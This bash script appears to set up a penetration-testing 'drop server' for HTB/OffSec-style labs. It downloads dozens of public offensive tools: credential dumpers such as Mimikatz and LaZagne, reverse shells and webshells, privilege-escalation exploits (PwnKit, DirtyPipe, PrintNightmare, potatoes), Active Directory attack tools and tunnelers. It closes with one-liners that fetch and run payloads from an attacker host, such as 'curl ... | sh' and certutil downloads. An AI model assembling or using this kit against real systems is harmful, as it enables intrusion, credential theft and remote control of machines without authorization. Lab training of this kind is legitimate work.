#!/usr/bin/env bash
# HTB / THM / OffSec / HS Drop Server — fetcher
# Author: Chris Alupului (Neospring)
# Populates the repo folder with common pentest tooling.
# Run from the repo root. Re-runnable; existing files are overwritten.

cd "$(dirname "$0")"
mkdir -p linux windows ad shells tunneling potatoes kernel-exploits sysinternals static-bins

UA="Mozilla/5.0"
ok=0; fail=0; failed=()
get() {
  if curl -fsSL --retry 2 -A "$UA" -o "$2" "$1"; then
    echo "[+] $2"; ok=$((ok+1))
  else
    echo "[-] FAIL $2"; fail=$((fail+1)); failed+=("$2  <- $1"); rm -f "$2"
  fi
}

echo "=== PEASS-ng ==="
get https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh           linux/linpeas.sh
get https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEAS.bat          windows/winPEAS.bat
get https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany.exe       windows/winPEASany.exe
get https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany_ofs.exe   windows/winPEASany_ofs.exe
get https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe       windows/winPEASx64.exe
get https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx86.exe       windows/winPEASx86.exe
get https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1  windows/winPEAS.ps1

echo "=== Linux enum / privesc ==="
get https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh   linux/lse.sh
get https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh                     linux/LinEnum.sh
get https://raw.githubusercontent.com/The-Z-Labs/linux-exploit-suggester/master/linux-exploit-suggester.sh   linux/les.sh
get https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl linux/les2.pl
get https://raw.githubusercontent.com/stealthcopter/deepce/main/deepce.sh                      linux/deepce.sh
get https://github.com/DominicBreuker/pspy/releases/latest/download/pspy32   linux/pspy32
get https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64   linux/pspy64
get https://github.com/DominicBreuker/pspy/releases/latest/download/pspy32s  linux/pspy32s
get https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64s  linux/pspy64s
get https://github.com/liamg/traitor/releases/latest/download/traitor-amd64  linux/traitor-amd64

echo "=== Windows enum scripts ==="
get https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1                  windows/PowerUp.ps1
get https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1                                windows/Sherlock.ps1
get https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1                                       windows/JAWS.ps1

echo "=== AD / post-ex ==="
get https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1               ad/PowerView.ps1
get https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1  ad/Invoke-Mimikatz.ps1
get https://raw.githubusercontent.com/61106960/adPEAS/main/adPEAS.ps1                                      ad/adPEAS.ps1
for bin in Rubeus.exe Seatbelt.exe SharpUp.exe Certify.exe SafetyKatz.exe SharpDPAPI.exe; do
  get "https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/$bin" "ad/$bin"
done
# SharpHound + SharpKatz from Flangvik SharpCollection (auto-built mirror)
get https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/SharpHound.exe ad/SharpHound.exe
get https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe  ad/SharpKatz.exe
get https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip  ad/mimikatz_trunk.zip

echo "=== Potatoes ==="
get https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe         potatoes/PrintSpoofer64.exe
get https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer32.exe         potatoes/PrintSpoofer32.exe
get https://github.com/BeichenDream/GodPotato/releases/latest/download/GodPotato-NET4.exe   potatoes/GodPotato-NET4.exe
get https://github.com/BeichenDream/GodPotato/releases/latest/download/GodPotato-NET35.exe  potatoes/GodPotato-NET35.exe
get https://github.com/BeichenDream/GodPotato/releases/latest/download/GodPotato-NET2.exe   potatoes/GodPotato-NET2.exe
get https://github.com/antonioCoco/JuicyPotatoNG/releases/latest/download/JuicyPotatoNG.zip potatoes/JuicyPotatoNG.zip
unzip -o potatoes/JuicyPotatoNG.zip -d potatoes/ >/dev/null 2>&1 && rm -f potatoes/JuicyPotatoNG.zip
get https://github.com/antonioCoco/RoguePotato/releases/latest/download/RoguePotato.zip     potatoes/RoguePotato.zip
get https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/SweetPotato.exe potatoes/SweetPotato.exe

echo "=== Shells ==="
get https://github.com/int0x33/nc.exe/raw/master/nc.exe    shells/nc.exe
get https://github.com/int0x33/nc.exe/raw/master/nc64.exe  shells/nc64.exe
get https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php shells/php-reverse-shell.php
get https://raw.githubusercontent.com/borjmz/aspx-reverse-shell/master/shell.aspx                  shells/shell.aspx
get https://raw.githubusercontent.com/tennc/webshell/master/jsp/jsp-reverse.jsp                    shells/jsp-reverse.jsp

echo "=== Tunneling ==="
chisel_lin=$(curl -fsSL https://api.github.com/repos/jpillora/chisel/releases/latest | awk -F\" '/browser_download_url.*linux_amd64/{print $4; exit}')
chisel_win=$(curl -fsSL https://api.github.com/repos/jpillora/chisel/releases/latest | awk -F\" '/browser_download_url.*windows_amd64/{print $4; exit}')
[ -n "$chisel_lin" ] && get "$chisel_lin" tunneling/chisel_linux_amd64.gz   && gunzip -f tunneling/chisel_linux_amd64.gz   2>/dev/null && mv -f tunneling/chisel_linux_amd64   tunneling/chisel
[ -n "$chisel_win" ] && get "$chisel_win" tunneling/chisel_windows_amd64.gz && gunzip -f tunneling/chisel_windows_amd64.gz 2>/dev/null && mv -f tunneling/chisel_windows_amd64 tunneling/chisel.exe
ligolo_tag=$(curl -fsSL https://api.github.com/repos/nicocha30/ligolo-ng/releases/latest | awk -F\" '/"tag_name"/{print $4; exit}')
ligolo_ver=${ligolo_tag#v}
if [ -n "$ligolo_ver" ]; then
  get "https://github.com/nicocha30/ligolo-ng/releases/download/${ligolo_tag}/ligolo-ng_agent_${ligolo_ver}_linux_amd64.tar.gz"   tunneling/ligolo_agent_linux.tar.gz
  get "https://github.com/nicocha30/ligolo-ng/releases/download/${ligolo_tag}/ligolo-ng_agent_${ligolo_ver}_windows_amd64.zip"   tunneling/ligolo_agent_windows.zip
  get "https://github.com/nicocha30/ligolo-ng/releases/download/${ligolo_tag}/ligolo-ng_proxy_${ligolo_ver}_linux_amd64.tar.gz"  tunneling/ligolo_proxy_linux.tar.gz
  tar -xzf tunneling/ligolo_agent_linux.tar.gz -C tunneling/ agent 2>/dev/null && mv -f tunneling/agent  tunneling/ligolo_agent  && rm -f tunneling/ligolo_agent_linux.tar.gz
  tar -xzf tunneling/ligolo_proxy_linux.tar.gz -C tunneling/ proxy 2>/dev/null && mv -f tunneling/proxy  tunneling/ligolo_proxy  && rm -f tunneling/ligolo_proxy_linux.tar.gz
  unzip -o tunneling/ligolo_agent_windows.zip agent.exe -d tunneling/ >/dev/null 2>&1 && mv -f tunneling/agent.exe tunneling/ligolo_agent.exe && rm -f tunneling/ligolo_agent_windows.zip
fi

echo "=== Kernel / local exploits ==="
get https://raw.githubusercontent.com/berdav/CVE-2021-4034/main/cve-2021-4034.c                                  kernel-exploits/pwnkit.c
get https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/main/exploit-1.c              kernel-exploits/dirtypipe.c
get https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/main/exploit-2.c               kernel-exploits/dirtypipe-2.c
get https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c                                           kernel-exploits/dirtycow.c

echo "=== Tier 1: essential PS/AD tooling ==="
priv_url=$(curl -fsSL https://api.github.com/repos/itm4n/PrivescCheck/releases/latest | awk -F\" '/browser_download_url.*PrivescCheck.ps1/{print $4; exit}')
[ -n "$priv_url" ] && get "$priv_url" windows/PrivescCheck.ps1
get https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1                  shells/powercat.ps1
get https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1 shells/Invoke-PowerShellTcp.ps1
get https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/Watson.exe      windows/Watson.exe
get https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/SharpView.exe   ad/SharpView.exe
get https://github.com/AlessandroZ/LaZagne/releases/latest/download/LaZagne.exe                 windows/LaZagne.exe
get https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64            linux/kerbrute
get https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_windows_amd64.exe      windows/kerbrute.exe

echo "=== Tier 2: Sysinternals ==="
for tool in PsExec.exe PsExec64.exe procdump.exe procdump64.exe accesschk.exe accesschk64.exe PsLoggedon.exe PsLoggedon64.exe; do
  get "https://live.sysinternals.com/$tool" "sysinternals/$tool"
done

echo "=== Tier 3: modern AD attacks ==="
get https://raw.githubusercontent.com/topotam/PetitPotam/main/PetitPotam.py  ad/PetitPotam.py
get https://raw.githubusercontent.com/Ridter/noPac/main/noPac.py             ad/noPac.py
get https://raw.githubusercontent.com/Ridter/noPac/main/scanner.py           ad/noPac_scanner.py
get https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/KrbRelayUp.exe  ad/KrbRelayUp.exe
get https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/ADSearch.exe    ad/ADSearch.exe
get https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_Any/Inveigh.exe     ad/Inveigh.exe
get https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/SharpChrome.exe      ad/SharpChrome.exe

echo "=== Tier 4: CVE PoCs ==="
get https://raw.githubusercontent.com/calebstewart/CVE-2021-1675/main/CVE-2021-1675.ps1                          kernel-exploits/PrintNightmare.ps1
get https://raw.githubusercontent.com/cube0x0/CVE-2021-1675/master/SharpPrintNightmare/CVE-2021-1675.py          kernel-exploits/CVE-2021-1675.py
get https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Invoke-MS16032.ps1  kernel-exploits/Invoke-MS16-032.ps1
get https://raw.githubusercontent.com/g1vi/CVE-2023-2640-CVE-2023-32629/main/exploit.sh                          kernel-exploits/gameoverlay.sh
get https://github.com/GossiTheDog/HiveNightmare/raw/master/Release/HiveNightmare.exe                            kernel-exploits/HiveNightmare.exe
get https://raw.githubusercontent.com/GossiTheDog/HiveNightmare/master/HiveNightmare/HiveNightmare.cpp           kernel-exploits/HiveNightmare.cpp

echo "=== Tier 5: static binaries (linux + win wget) ==="
SB="https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64"
for b in socat nmap ncat python python2.7 nping p0f; do
  get "$SB/$b" "static-bins/$b"
done
get https://busybox.net/downloads/binaries/1.31.0-defconfig-multiarch-musl/busybox-x86_64  static-bins/busybox
get https://eternallybored.org/misc/wget/1.21.4/64/wget.exe                                 static-bins/wget.exe
get https://eternallybored.org/misc/wget/1.21.4/32/wget.exe                                 static-bins/wget32.exe

chmod +x linux/* tunneling/chisel tunneling/* potatoes/*.exe static-bins/* 2>/dev/null

echo
echo "==================================================="
echo "  fetched: $ok    failed: $fail"
[ "$fail" -gt 0 ] && { echo "  failures:"; printf '   %s\n' "${failed[@]}"; }
echo "==================================================="
echo
echo "Quick fetch one-liners (replace IP with your tun0):"
echo "  Linux:   curl http://10.10.14.x/linux/linpeas.sh | sh"
echo "  PS:      iwr http://10.10.14.x/windows/winPEASx64.exe -o w.exe; .\\w.exe"
echo "  certutil: certutil -urlcache -f http://10.10.14.x/shells/nc64.exe nc.exe"
